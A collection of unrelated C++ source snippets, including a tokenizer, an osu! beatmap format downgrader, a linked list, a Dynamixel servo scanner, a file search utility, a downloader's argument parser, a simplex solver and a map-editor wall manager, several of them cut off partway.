    "#undef NDEBUG\r\n#include <iostream>\r\n#include <cassert>\r\n#include <fstream>\r\n#include <cstdint>\r\n#include <cstdlib>\r\n#include <vector>\r\n\r\ninline static char* findFirst(char* str, char c)\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tif (*_c == c) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirst(char* str, const char* chars)\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tfor (const char* c = chars; *c != '\\0'; c++)\r\n\t\t\tif (*_c == *c) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirstNot(char* str, const char* chars)\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tfor (const char* c = chars; *c != '\\0'; c++)\r\n\t\t\tif (*_c != *c) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirst(char* str, int f(int))\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tif (f(*_c)) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirstNot(char* str, int f(int))\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tif (!f(*_c)) return _c;\r\n\treturn _c;\r\n}\r\n\r\n#pragma pack(2)\r\nstruct String\r\n{\r\n\tchar* start;\r\n\tuint16_t length;\r\n\r\n\ttemplate <typename T>\r\n\tinline T applyAsNormalString(T f(const char*)) const\r\n\t{\r\n\t\tchar ei = start[length];\r\n\t\tstart[length] = '\\0';\r\n\t\tT v = f(start);\r\n\t\tstart[length] = ei;\r\n\t\treturn v;\r\n\t}\r\n\r\n\tinline void print() const\r\n\t{\r\n\t\tfor (uint16_t i = 0; i < length; i++)\r\n\t\t\tputchar(start[i]);\r\n\t}\r\n\r\n\tinline long long toInt() const\r\n\t{\r\n\t\treturn applyAsNormalString(atoll);\r\n\t}\r\n\r\n\tinline double toDouble() const\r\n\t{\r\n\t\treturn applyAsNormalString(atof);\r\n\t}\r\n};\r\n\r\ninline static void todo(const char* str)\r\n{\r\n\tstd::cout << \"TODO: \" << str;\r\n\tabort();\r\n}\r\n\r\nnamespace tokenKinds\r\n{\r\n\tconstexpr uint8_t\r\n\t\tnumber = 0,\r\n\t\talpha = 1,\r\n\t\tsolo = 2,\r\n\t\tstring = 3;\r\n\r\n\tconst char* names[] = {\r\n\t\t\"number\",\r\n\t\t\"alpha\",\r\n\t\t\"solo\",\r\n\t\t\"\\033[32mstring\"\r\n\t};\r\n}\r\n\r\nstruct Token\r\n{\r\n\tString str;\r\n\tuint8_t kind;\r\n\r\n\tinline void print() const\r\n\t{\r\n\t\tstd::cout << tokenKinds::names[kind] << \"\\033[0m\\t'\\033[36m\";\r\n\r\n\t\tstr.print();\r\n\r\n\t\tstd::cout << \"\\033[0m'\\n\";\r\n\t}\r\n};\r\n\r\nint main()\r\n{\r\n\tstd::vector<Token> tokens;\r\n\r\n\tstd::ifstream file(\"test.jiw\");\r\n\tassert(file.is_open());\r\n\r\n\tfile.seekg(0, std::ios::end);\r\n\tsize_t fileSize = file.tellg();\r\n\tfile.seekg(0, std::ios::beg);\r\n\r\n\tchar* buffer = (char*)malloc(fileSize);\r\n\tassert(buffer != nullptr);\r\n\r\n\tfile.read(buffer, fileSize);\r\n\tfile.close();\r\n\r\n\tuint8_t kind;\r\n\tchar* end = nullptr;\r\n\tfor (char* c = buffer; *c != '\\0';)\r\n\t{\r\n\t\tif (isspace(*c))\r\n\t\t{\r\n\t\t\tc++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\telse if (isdigit(*c))\r\n\t\t{\r\n\t\t\tend = findFirstNot(c + 1, isdigit);\r\n\t\t\tkind = tokenKinds::number;\r\n\t\t}\r\n\t\telse if (isalpha(*c))\r\n\t\t{\r\n\t\t\tend = findFirstNot(c + 1, isalnum);\r\n\t\t\tkind = tokenKinds::alpha;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tif (*c == '/')\r\n\t\t\t{\r\n\t\t\t\tif (c[1] == '/')\r\n\t\t\t\t{\r\n\t\t\t\t\tc = findFirst(c + 2, '\\n') + 1;\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\t}\r\n\t\t\t\telse if (c[1] == '*')\r\n\t\t\t\t{\r\n\t\t\t\t\tc++;\r\n\t\t\t\t\twhile (true)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tc = findFirst(c + 1, '*');\r\n\t\t\t\t\t\tif (c[1] == '/')\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tc += 2;\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\r\n\t\t\ttokens.push_back({ { c, 1 }, tokenKinds::solo });\r\n\r\n\t\t\tif (*c == '\"')\r\n\t\t\t{\r\n\t\t\t\tend = findFirst(++c, '\"');\r\n\t\t\t\ttokens.push_back({ { c, static_cast<uint16_t>(end - c) }, tokenKinds::string });\r\n\t\t\t\ttokens.push_back({ { c = end, 1 }, tokenKinds::solo });\r\n\t\t\t}\r\n\r\n\t\t\tc++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\r\n\t\ttokens.push_back({ { c, static_cast<uint16_t>(end - c) }, kind });\r\n\t\tc = end;\r\n\t}\r\n\r\n\tfor (Token& token : tokens)\r\n\t{\r\n\t\ttoken.print();\r\n\t}\r\n}",
    "#include <iostream>\r\n#include <filesystem>\r\n#include <vector>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <string.h>\r\n#include <string_view>\r\n#include <algorithm>\r\n\r\nvoid downgradeOsuFile(std::filesystem::path filePath, bool keepOD);\r\n\r\nstd::string removeCarriageReturn(std::string str)\r\n{\r\n  str.erase(std::remove(str.begin(), str.end(), '\\r'), str.end());\r\n  return str;\r\n}\r\nbool is_number(const std::string &s)\r\n{\r\n  std::string::const_iterator it = s.begin();\r\n  while (it != s.end() && std::isdigit(*it))\r\n    ++it;\r\n  return !s.empty() && it == s.end();\r\n}\r\nstd::string replaceString(std::string subject, const std::string &search, const std::string &replace)\r\n{\r\n  size_t pos = subject.find(search);\r\n  while (pos != std::string::npos)\r\n  {\r\n    subject.replace(pos, search.length(), replace);\r\n    pos = subject.find(search, pos + replace.length());\r\n  }\r\n  return subject;\r\n}\r\nbool string_contains(std::string input, std::string key)\r\n{\r\n  if (input.find(key) != std::string::npos)\r\n  {\r\n    return true;\r\n  }\r\n  return false;\r\n}\r\nstd::vector<std::string> split(std::string s, std::string delimiter)\r\n{\r\n  size_t pos_start = 0, pos_end, delim_len = delimiter.length();\r\n  std::string token;\r\n  std::vector<std::string> res;\r\n\r\n  while ((pos_end = s.find(delimiter, pos_start)) != std::string::npos)\r\n  {\r\n    token = s.substr(pos_start, pos_end - pos_start);\r\n    pos_start = pos_end + delim_len;\r\n    res.push_back(token);\r\n  }\r\n\r\n  res.push_back(s.substr(pos_start));\r\n  return res;\r\n}\r\nstd::vector<std::string> split_first(std::string s, std::string delimiter)\r\n{\r\n  size_t pos_start = 0, pos_end, delim_len = delimiter.length();\r\n  std::string token;\r\n  std::vector<std::string> res;\r\n\r\n  if ((pos_end = s.find(delimiter, pos_start)) != std::string::npos)\r\n  {\r\n    token = s.substr(pos_start, pos_end - pos_start);\r\n    res.push_back(token);\r\n    pos_start = pos_end + delim_len;\r\n  }\r\n\r\n  res.push_back(s.substr(pos_start));\r\n  return res;\r\n}\r\n\r\nint main()\r\n{\r\n  int option_range = 0;\r\n  std::cout << \"##################\\nosuTo2007 v1.6\\nosu! : _Railgun_\\nDiscord : @railgun_osu\\n##################\\n\\n\";\r\n  std::vector<std::filesystem::path> map_list;\r\n  for (const auto &entry : std::filesystem::directory_iterator(std::filesystem::current_path()))\r\n  {\r\n    if (entry.path().extension() == \".osu\")\r\n    {\r\n      map_list.push_back(entry.path());\r\n    }\r\n  }\r\n  if (map_list.size() == 0)\r\n  {\r\n    std::cout << \"No .osu files found\\nExiting...\";\r\n    return 0;\r\n  }\r\n  else\r\n  {\r\n    std::cout << \"Choose which .osu file you want to convert to v3:\\n\\n\";\r\n    if (map_list.size() > 1)\r\n    {\r\n      std::cout << \"0 = All listed below\\n\";\r\n    }\r\n    for (size_t i = 1; i - 1 < map_list.size(); i++)\r\n    {\r\n      std::cout << i << \" = \" << map_list[i - 1].filename() << \"\\n\";\r\n      option_range++;\r\n    }\r\n  }\r\nopt:\r\n  std::cout << \"Choose an option:\\n\";\r\n  std::string input;\r\n  std::cin >> input;\r\n  if (!is_number(input))\r\n  {\r\n    std::cout << \"Not a number\\n\";\r\n    goto opt;\r\n  }\r\n  if (!(std::stoi(input) < option_range + 1))\r\n  {\r\n    std::cout << \"Invalid Option\\n\";\r\n    goto opt;\r\n  }\r\n  bool keep_OD;\r\nopt2:\r\n  std::cout << \"Because in v3 AR(ApproachRate) is tied to OD(OverallDifficulty):\\nOD = AR\\nDo you prefer to have:\\n1 = same OverallDifficulty (map might be hard to read)\\n2 = same ApproachRate (map might be hard to acc)\\n\";\r\n  std::string input2;\r\n  std::cin >> input2;\r\n  if (!is_number(input2))\r\n  {\r\n    std::cout << \"Not a number\\n\";\r\n    goto opt2;\r\n  }\r\n  if ((std::stoi(input2) < 1) || (std::stoi(input2) > 2))\r\n  {\r\n    std::cout << \"Invalid Option\\n\";\r\n    goto opt2;\r\n  }\r\n  if (input2 == \"1\")\r\n  {\r\n    keep_OD = true;\r\n  }\r\n  else\r\n  {\r\n    keep_OD = false;\r\n  }\r\n  if (std::stoi(input) == 0)\r\n  {\r\n    for (int i = 0; i < map_list.size(); i++)\r\n    {\r\n      downgradeOsuFile(map_list[i], keep_OD);\r\n    }\r\n  }\r\n  else\r\n  {\r\n    downgradeOsuFile(map_list[std::stoi(input) - 1], keep_OD);\r\n  }\r\n  return 0;\r\n}\r\n\r\nvoid downgradeOsuFile(std::filesystem::path filePath, bool keepOD)\r\n{\r\n  // predefined keys to search for\r\n  static std::vector<std::string> general_Var = {\"AudioFilename\", \"PreviewTime\", \"SampleSet\"};\r\n  static std::vector<std::string> metaData_Var = {\"Title\", \"Artis\", \"Creator\", \"Version\"};\r\n  static std::vector<std::string> difficulty_Var = {\"HPDrainRate\", \"CircleSize\", \"OverallDifficulty\", \"ApproachRate\", \"SliderMultiplier\", \"SliderTickRate\"};\r\n\r\n  // current filename\r\n  std::string fileName = \"(converted) \" + filePath.filename().string();\r\n\r\n  // osu file format version\r\n  std::string fileFormat = \"\";\r\n  std::string OD_line = \"\";\r\n  std::string AR_line = \"\";\r\n  std::vector<std::pair<std::string, std::string>> general, metadata, difficulty;\r\n  std::vector<std::string> events, timingPoints, hitObjects;\r\n  bool skip = false;\r\n  int section = 0;\r\n  std::cout << \"Downgrading \" << filePath.filename() << \" to v3 file format...\\n\";\r\n  std::ifstream file(filePath);\r\n  if (file.is_open())\r\n  {\r\n    std::string line;\r\n\r\n  ",
    "#include<iostream>\nusing namespace std;\n\nclass DounlyLinkedList{\nprivate:\n    class Node{\n    public:\n        int Data;\n        Node* Next;\n        Node* Prev;\n    };\n\n    Node *Head;\n    Node *Tail;\n    int Length;\n\npublic:    \n    DounlyLinkedList(){\n        Head = Tail = NULL;\n        Length = 0;\n    }\n\n    void insertFirst(int element) {\n        Node *newNode = new Node;  \n        newNode->Data = element; \n        newNode->Next = Head;\n        newNode->Prev = NULL; \n        \n        if (Head != NULL) {\n            Head->Prev = newNode;\n        } else {\n            // If the list was empty, newNode is both Head and Tail\n            Tail = newNode;\n        }\n    \n        Head = newNode; \n        Length++;\n}\n\n    void insertLast(int element) {\n\n        Node *newNode = new Node;\n        newNode->Data = element;\n        newNode->Next = NULL;\n\n        if (Head == NULL) {\n            Head = Tail = newNode;\n            newNode->Prev=NULL;\n        } else {\n            newNode->Prev=Tail;\n            Tail->Next = newNode;\n            Tail = newNode;\n        }\n        Length++;\n    }\n\n    void insertAtPos(int element, int Pos) {\n        if (Pos == 0) {\n            insertFirst(element);\n        } else if (Pos == Length) {\n            insertLast(element);\n        } else if (Pos > Length || Pos < 0) {\n            cout << \"Position out of range\" << endl;\n        } else {\n            Pos--; // Adjusting position to match zero-based indexing\n            Node *newNode = new Node;\n            newNode->Data = element;\n\n            Node *Temp = Head;\n            while (Pos--) {\n                Temp = Temp->Next;\n            }\n            newNode->Next = Temp->Next;\n            Temp->Next->Prev = newNode;\n            newNode->Prev = Temp;\n            Temp->Next = newNode;\n\n            Length++;\n        }\n    }\n\n    void removeFirst(){\n        if (Head==NULL){\n            cout<<\"The list is aready empty\\n\";\n        }else if (Head==Tail){\n            delete Head;\n            Head = Tail = NULL;\n\n            Length--;\n        }else {\n            Node *Temp = Head;\n            Head = Head->Next;\n            if (Head != NULL) {\n                Head->Prev = NULL;\n            } else {\n                // If Head->Next is NULL, Head is now the only node in the list\n                Tail = NULL;\n            }\n            delete Temp;\n            Length--;\n        }\n    }\n\n    void removeLast(){\n        if (Tail==NULL){\n            cout<<\"The list is aready empty\\n\";\n        }else if (Tail==Head){\n            delete Tail;\n            Tail = Head = NULL;\n            Length--;\n        }else{\n            Node *Temp = Tail;\n            Tail = Tail->Prev;\n            if (Tail != NULL) {\n                Tail->Next = NULL;\n            }else{\n                // If Tail->Prev is NULL, Tail is now the only node in the list\n                Head = NULL;\n            }       \n            delete Temp;\n\n            Length--;\n        }\n    }\n    \n    void removeAtPos(int Pos){\n       if (Pos==0){\n            removeFirst();\n        }else if (Pos == Length - 1) {\n            removeLast();\n        }else if (Pos>Length || Pos<0){\n            cout<<\"Position out of range\"<<endl;\n        }else{\n            Pos--; // Adjusting position to match zero-based indexing\n            \n            Node *Temp = Head;\n            while (Pos--){\n                Temp=Temp->Next;\n            }\n\n            Node *ToDelete = Temp->Next;\n            Temp->Next = Temp->Next->Next;\n\n            if (Temp->Next != NULL) {\n                Temp->Next->Prev = Temp;\n            } else {\n                // If the next node is NULL, the deleted node was the previous Tail\n                Tail = Temp;\n            }\n            \n            delete ToDelete;\n            Length--;\n        }        \n    }\n\n    int getLength(){\n        int len=0;\n        Node *currentNode = Head;\n        while (currentNode!= NULL){\n            len++;\n            currentNode = currentNode->Next;\n        }\n        return len;\n    }\n\n    void atPos(int Pos){\n        \n        if (Pos==0){\n            cout<<Head->Data<<endl; \n        }else if (Pos==this->getLength()-1){\n            cout<<Tail->Data<<endl;\n        }else if (Pos>=this->getLength()){\n            cout<<\"Position out of range\"<<endl;\n        }else{\n            Node *Temp = Head;\n            while (Pos--){\n                Temp=Temp->Next;\n            }\n            cout<<Temp->Data<<endl;\n        }\n    }\n\n    int find(int element){\n        Node *Temp=Head;\n        int index=0;\n        while (Temp!=NULL){\n            if (Temp->Data==element){\n                return index; \n            }\n            Temp=Temp->Next;\n            index++;\n        }\n        return -1;\n    }\n\n    void traverseForward(){\n        if (Head == NULL){\n            cout << \"List is empty\" << endl;\n            return;\n        }\n        Node *currentNode = Head;\n        while (currentNode->Next != NULL){\n            cout << currentNode->Data << \" -> \";\n            currentNode = currentN",
    "/*******************************************************************************\r\n* Copyright 2018 ROBOTIS CO., LTD.\r\n*\r\n* Licensed under the Apache License, Version 2.0 (the \"License\");\r\n* you may not use this file except in compliance with the License.\r\n* You may obtain a copy of the License at\r\n*\r\n*     http://www.apache.org/licenses/LICENSE-2.0\r\n*\r\n* Unless required by applicable law or agreed to in writing, software\r\n* distributed under the License is distributed on an \"AS IS\" BASIS,\r\n* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r\n* See the License for the specific language governing permissions and\r\n* limitations under the License.\r\n*******************************************************************************/\r\n\r\n/* Authors: Taehun Lim (Darby) */\r\n\r\n#include <ros/ros.h>\r\n#include <dynamixel_workbench_toolbox/dynamixel_workbench.h>\r\n\r\n#define BAUDRATE_NUM 7\r\n\r\nint main(int argc, char *argv[]) \r\n{\r\n  std::string port_name = \"/dev/ttyUSB0\";\r\n\r\n  if (argc < 2)\r\n  {\r\n    printf(\"Please set '-port_name'arguments for connected Dynamixels\\n\");\r\n    return 0;\r\n  }\r\n  else\r\n  {\r\n    port_name = argv[1];\r\n  }\r\n\r\n  DynamixelWorkbench dxl_wb;\r\n\r\n  const char *log;\r\n  bool result = false;\r\n\r\n  uint8_t scanned_id[100];\r\n  uint8_t dxl_cnt = 0;\r\n\r\n  uint32_t baudrate[BAUDRATE_NUM] = {9600, 57600, 115200, 1000000, 2000000, 3000000, 4000000};\r\n  uint8_t range = 253;\r\n\r\n  uint8_t index = 0;\r\n\r\n  while (index < BAUDRATE_NUM)\r\n  {\r\n    result = dxl_wb.init(port_name.c_str(), baudrate[index], &log);\r\n    if (result == false)\r\n    {\r\n      ROS_WARN(\"%s\", log);\r\n      ROS_WARN(\"Failed to init(%d)\", baudrate[index]);\r\n    }\r\n    else\r\n    {\r\n        ROS_INFO(\"Succeed to init(%d)\", baudrate[index]);\r\n    \r\n\r\n      dxl_cnt = 0;\r\n      for (uint8_t num = 0; num < 100; num++) scanned_id[num] = 0;\r\n\r\n      ROS_INFO(\"Wait for scanning...\");\r\n      result = dxl_wb.scan(scanned_id, &dxl_cnt, range, &log);\r\n      if (result == false)\r\n      {\r\n        ROS_WARN(\"%s\", log);\r\n        ROS_WARN(\"Failed to scan\");\r\n      }\r\n      else\r\n      {\r\n        ROS_INFO(\"Find %d Dynamixels\", dxl_cnt);\r\n\r\n        for (int cnt = 0; cnt < dxl_cnt; cnt++)\r\n          ROS_INFO(\"id : %d, model name : %s\", scanned_id[cnt], dxl_wb.getModelName(scanned_id[cnt]));\r\n      }\r\n    }\r\n    \r\n    dxl_wb.~DynamixelWorkbench();\r\n    index++;\r\n  }\r\n\r\n  return 0;\r\n}\r\n",
    "#include <iostream>\n#include <string>\n#include <filesystem>\n#include <vector>\n#include <thread>\n#include <chrono>\n#include <ctime>\nusing namespace std;\nint num = 0;\nbool active = true;\nstring sword = \"your file\";\nstring path = \"your searching path\";\nfloat timeout = 666.0;\nvector<string> exceptions = {\"sys\", \".speech-dispatcher\", \".wine\", \"llvm-14\", \"proc\", \"X11\", \"steam\", \"z:\"};\nvector<string> results;\nvoid checker(){\n    float timet = 0;\n    while(active){\n        this_thread::sleep_for(0.1s);\n        timet += 0.1;\n        if(timet >= timeout){\n            active = false;\n            break;\n        }\n    }\n}\nstring mlower(string str){\n    for(char & stabe : str){\n        stabe = tolower(stabe);\n    }\n    return str;\n}\nbool check_it(string inp, vector<string> inplist){\n    bool h = true;\n    for(string element : inplist){\n        if(mlower(element) == mlower(inp)){\n            return false;\n            h = false;\n            break;\n        }\n    }\n    if(h){return true;}\n}\nvector<string> split_str(string tos, char del){\n    vector<string> re;\n    string h;\n    for(auto& stabe : tos){\n        if(stabe != del){\n        h = h + stabe;}\n        else if(stabe == del){\n            re.push_back(h);\n            h = \"\";\n        }\n    }\n    if(tos[tos.size()] != del){\n        re.push_back(h);\n    }\n    return re;\n}\nstring wend(string str){\n    vector<string> sstr = split_str(str, '.');\n    return sstr[0];\n}\nvoid search_folder(string folder){\n    if(active){\n        try{\n    vector<string> files;\n    vector<string> folders;\n    for (const auto & entry : filesystem::directory_iterator(folder))\n        if(filesystem::is_regular_file(entry)){\n             files.push_back(entry.path().c_str());\n        }\n        else if(filesystem::is_directory(entry)){\n             folders.push_back(entry.path().c_str());\n        }     \n    for(string fpath : files){\n        vector<string> filename  = split_str(fpath, '/');\n        if(mlower(wend(filename[filename.size()-1])) == mlower(wend(sword))){\n            results.push_back(fpath);\n        }\n        num++;\n    }\n    for(string folder : folders){\n        vector<string> foldername = split_str(folder, '/');\n        if(mlower(foldername[foldername.size()-1]) == mlower(wend(sword))){\n            results.push_back(folder);\n            cout<<folder<<endl;}   \n        if(check_it(foldername[foldername.size()-1], exceptions)){\n        search_folder(folder);}\n        cout<<\"\\033[1;35m\"+folder+\"\\033[0m\"<<endl;\n    } }\n    catch(...){\n        ;\n    }}\n}\nint main(){\n    time_t start = time(nullptr);\n    thread t1 = thread(checker);\n    t1.detach();\n    thread t2 = thread(search_folder, path);\n    t2.join();\n    active = false;\n    cout<<\"\\n\\n\\n\\033[1;31mResults:\\033[0m\\n\";\n    for(const string element: results){\n        cout<<\"\\033[1;32m    \"+element+\"\\033[0m\"<<endl;\n    }\n    cout<<\"\\n\";\n    cout<<\"\\033[1;31mEnded searching \"+to_string(num)+\" files \"+to_string(time(nullptr)-start)+\"secs\\033[0m\\n\";\n}\n",
    "#include <argumentParser/argumentParser.hpp>\n\nargumentParser::argumentParser(int argc, char** argv) {\n    this->argCount = argc;\n    this->argValues = argv;\n}\n\nsettings argumentParser::parse() {\n    if(this->argCount <= 1) {\n        this->setting.showHelp = true;\n        return this->setting;\n    }\n\n    // parse the rest\n    for(int i = 1; i < this->argCount; i++) {\n        if(string(this->argValues[i]) == \"--help\" || string(this->argValues[i]) == \"-h\") {\n            this->setting.showHelp = true;\n            continue;\n        }\n\n        if(string(this->argValues[i]) == \"--version\" || string(this->argValues[i]) == \"-v\") {\n            this->setting.showVersion = true;\n            continue;\n        }\n\n        if(string(this->argValues[i]) == \"--url\" || string(this->argValues[i]) == \"-u\") {\n            this->setting.dlUrl = string(this->argValues[i + 1]);\n            i++;\n            continue;\n        }\n\n        if(string(this->argValues[i]) == \"--type\" || string(this->argValues[i]) == \"-t\") {\n            this->setting.mediaType = string(this->argValues[i + 1]);\n            i++;\n            continue;\n        }\n\n        if(string(this->argValues[i]) == \"--indexOverwrite\" || string(this->argValues[i]) == \"-io\") {\n            this->setting.indexOverwrite = std::stoi(this->argValues[i + 1]);\n            i++;\n            continue;\n        }\n\n        if(string(this->argValues[i]) == \"--idOverwrite\" || string(this->argValues[i]) == \"-ido\") {\n            this->setting.idOverwrite = std::stoi(this->argValues[i + 1]);\n            i++;\n            continue;\n        }\n\n        if(string(this->argValues[i]) == \"--links\" || string(this->argValues[i]) == \"-l\") {\n            this->setting.linkList = this->argValues[i + 1];\n            this->setting.list = true;\n            i++;\n            continue;\n        }\n\n        if(string(this->argValues[i]) == \"--reverse\" || string(this->argValues[i]) == \"-r\") {\n            this->setting.reverse = true;\n            continue;\n        }\n        \n        tools::printLine();\n        cout << \"==\" << endl;\n        cout << \"==\" << colors::boldRed(\" Error: Unknown argument: \") << this->argValues[i] << endl;\n        cout << \"==\" << endl;\n        tools::printLine();\n\n        exit(1);\n    }\n\n    // add playlist tag if url provided is a playlist\n    if(this->setting.dlUrl.find(\"playlist?list=\") != std::string::npos) {\n        this->setting.mediaType += \"Playlist\";\n    }\n\n    return this->setting;\n}\n\nvoid argumentParser::checkArguments() {\n    // check if url has valid url pattern using regex\n    string urlPattern = \"((http|https)://)(www.)?[a-zA-Z0-9@:%._\\\\+~#?&//=]{2,256}\\\\.[a-z]{2,6}\\\\b([-a-zA-Z0-9@:%._\\\\+~#?&//=]*)\";\n    std::regex urlRegex(urlPattern);\n\n    // list does not have this argument so its not needed\n    if (std::regex_match(this->setting.dlUrl, urlRegex) != true && setting.list == false) {\n        tools::printLine();\n        cout << \"==\" << endl;\n        cout << \"==\" <<colors::boldRed(\" Error: Invalid URL\") << endl;\n        cout << \"==\" << endl;\n        tools::printLine();\n        exit(1);\n    }\n\n    // check if mediaType is valid\n    if(!(this->setting.mediaType == \"music\" || \\\n         this->setting.mediaType == \"musicPlaylist\" || \\\n         this->setting.mediaType == \"video\" || \\\n         this->setting.mediaType == \"videoPlaylist\" || \\\n         this->setting.mediaType == \"rss\")) \n        {\n        tools::printLine();\n        cout << \"==\" << endl;\n        cout << \"==\" << colors::boldRed(\" Error: Unknown mediaType: \") << setting.mediaType << endl;\n        cout << \"==\" << endl;\n        tools::printLine();\n        exit(1);\n    }\n}",
    "#include \"simplex.h\"\n#include \"matrix.h\"\n\n#define DEBUG_MODE 1\n#include \"../program_defs.h\"\n#define MAX_ITERATIONS 1e4\n\nvoid Simplex::run()\n{\n    delete result;\n\n    if (input == nullptr || output == nullptr || function == nullptr) return;\n\n    int eqCount = input->getRows();\n    int varCount = function->getColumns();\n    Matrix simplexMatrix(eqCount + 1, eqCount + varCount + 1);\n    Matrix idx(eqCount, 1);\n\n    setProgress(0.02);\n\n    // Initializing function\n    for (int i = 0; i < varCount; i++) simplexMatrix.setAt(0, i, function->getAt(0, i));\n    setProgress(0.04);\n    for (int i = 0; i < eqCount; i++)\n    {\n        simplexMatrix.setAt(i + 1, varCount + i, 1);\n        simplexMatrix.setAt(i + 1, varCount + eqCount, output->getAt(i, 0));\n        idx.setAt(i, 0, varCount + i);\n    }\n    setProgress(0.06);\n    for (int i = 0; i < eqCount; i++)\n    {\n        for (int j = 0; j < varCount; j++)\n        {\n            simplexMatrix.setAt(i + 1, j, input->getAt(i, j));\n        }\n    }\n    setProgress(0.1);\n\n    for (int k = 0; k < MAX_ITERATIONS; k++)\n    {\n        int optimalVariables = 0;\n        for (int i = 0; i < varCount; i++)\n        {\n            if (simplexMatrix.getAt(0, i) >= 0) optimalVariables++;\n        }\n\n        setProgress(0.1 + (0.85 * optimalVariables) / varCount);\n        if (optimalVariables == varCount) break;\n\n        int pivotElementRow = -1, pivotElementColumn = -1;\n        double flag = 0;\n        for (int j = 0; j < eqCount + varCount; j++)\n        {\n            if (simplexMatrix.getAt(0, j) <= flag)\n            {\n                pivotElementColumn = j;\n                flag = simplexMatrix.getAt(0, j);\n            }\n        }\n\n        if (pivotElementColumn == -1) break;\n\n        flag = 1e300;\n        for (int i = 1; i < eqCount + 1; i++)\n        {\n            if (simplexMatrix.getAt(i, pivotElementColumn) == 0) continue;\n\n            double v = simplexMatrix.getAt(i, eqCount + varCount) / simplexMatrix.getAt(i, pivotElementColumn);\n            if (v < flag)\n            {\n                pivotElementRow = i;\n                flag = v;\n            }\n        }\n        idx.setAt(pivotElementRow - 1, 0, pivotElementColumn);\n\n        for (int j = 0; j < eqCount + varCount + 1; j++)\n        {\n            for (int i = 0; i < eqCount + 1; i++)\n            {\n                if (i != pivotElementRow && j != pivotElementColumn)\n                {\n                    simplexMatrix.setAt(i, j, simplexMatrix.getAt(i, j) - (simplexMatrix.getAt(pivotElementRow, j) * simplexMatrix.getAt(i, pivotElementColumn)) / simplexMatrix.getAt(pivotElementRow, pivotElementColumn));\n                }\n            }\n            simplexMatrix.setAt(pivotElementRow, j, simplexMatrix.getAt(pivotElementRow, j) / simplexMatrix.getAt(pivotElementRow, pivotElementColumn));\n        }\n\n        for (int i = 0; i < eqCount + 1; i++)\n        {\n            simplexMatrix.setAt(i, pivotElementColumn, i == pivotElementRow ? 1 : 0);\n        }\n    }\n\n    setProgress(0.95);\n\n    // Generating results;\n    result = new Matrix(varCount, 1);\n    for (int i = 0; i < varCount; i++)\n    {\n        int k;\n        for (k = 0; k < eqCount; k++)\n        {\n            if (idx.getAt(k, 0) == i) break;\n        }\n\n        result->setAt(i, 0, simplexMatrix.getAt(k + 1, eqCount + varCount));\n    }\n    setProgress(1.0);\n\n    emit calculationFinished();\n}\n",
    "// WallMgr.cpp: implementation of the CWallMgr class.\n//\n//////////////////////////////////////////////////////////////////////\n\n#include \"stdafx.h\"\n#include \"n3me.h\"\n#include \"WallMgr.h\"\n#include \"Wall.h\"\n#include \"MapMng.h\"\n#include \"MainFrm.h\"\n#include \"DlgMakeWall.h\"\n#include \"LyTerrain.h\"\n#include \"../N3Base/N3ShapeMgr.h\"\n\nCWallMgr::CWallMgr()\n{\n\tm_BaseCube[0].Set(0, 1, 0);\t// \uc55e\ucabd LT\n\tm_BaseCube[1].Set(1, 1, 0);\t// \uc55e\ucabd RT\n\tm_BaseCube[2].Set(0, 0, 0); // \uc55e\ucabd LB\n\tm_BaseCube[3].Set(1, 0, 0); // \uc55e\ucabd RB\n\tm_BaseCube[4].Set(0, 1, 1); // \ub4a4\ucabd LT\n\tm_BaseCube[5].Set(1, 1, 1); // \ub4a4\ucabd RT\n\tm_BaseCube[6].Set(0, 0, 1); // \ub4a4\ucabd LB\n\tm_BaseCube[7].Set(1, 0, 1);\t// \ub4a4\ucabd RB\n\t\n\tm_pRefMapMng = NULL;\t// \uc9c0\ud615 \ucc38\uc870 \ud3ec\uc778\ud130..\n\tm_pWalls.clear();\t\t// \ubcbd\ub4e4...\n\n\tm_pDlg = new CDlgMakeWall;\n\tm_pDlg->Create(IDD_MAKE_WALL);\n\tm_pDlg->ShowWindow(FALSE);\n\tm_pDlg->m_pRefWallMgr = this;\n\n\tm_bActive = false; // \uc774\uae30\ub2a5\uc774 \ud65c\uc131\ud654 \ub418\uc5b4 \uc788\ub294\uc9c0...1:\ud65c\uc131\ud654, 0:\ube44\ud65c\uc131\ud654..\n\tm_pCurrWall = NULL;\n}\n\nCWallMgr::~CWallMgr()\n{\n\tstd::list<CWall*>::iterator it;\n\tfor(it = m_pWalls.begin(); it != m_pWalls.end(); it++)\n\t{\n\t\tdelete (*it);\n\t\t(*it) = NULL;\n\t}\n\tm_pWalls.clear();\n\n\tif(m_pCurrWall)\n\t{\n\t\tdelete m_pCurrWall;\n\t\tm_pCurrWall = NULL;\n\t}\n\n\tif(m_pDlg) \n\t{\n\t\tm_pDlg->DestroyWindow();\n\t\tdelete m_pDlg;\n\t\tm_pDlg = NULL;\n\t}\n}\n\n///////////////////////////////////////////////////////////////////////////\n\nvoid CWallMgr::MakeLine(__Vector3 sv, __Vector3 ev, D3DCOLOR color)\n{\n\tm_LineVB[0].Set(sv.x, sv.y, sv.z, color);\n\tm_LineVB[1].Set(ev.x, ev.y, ev.z, color);\n}\n\nvoid CWallMgr::MakeBoard(__Vector3 sv, __Vector3 ev, D3DCOLOR color)\n{\n\tm_BoardVB[0].Set(sv.x, sv.y + 100.0f, sv.z, 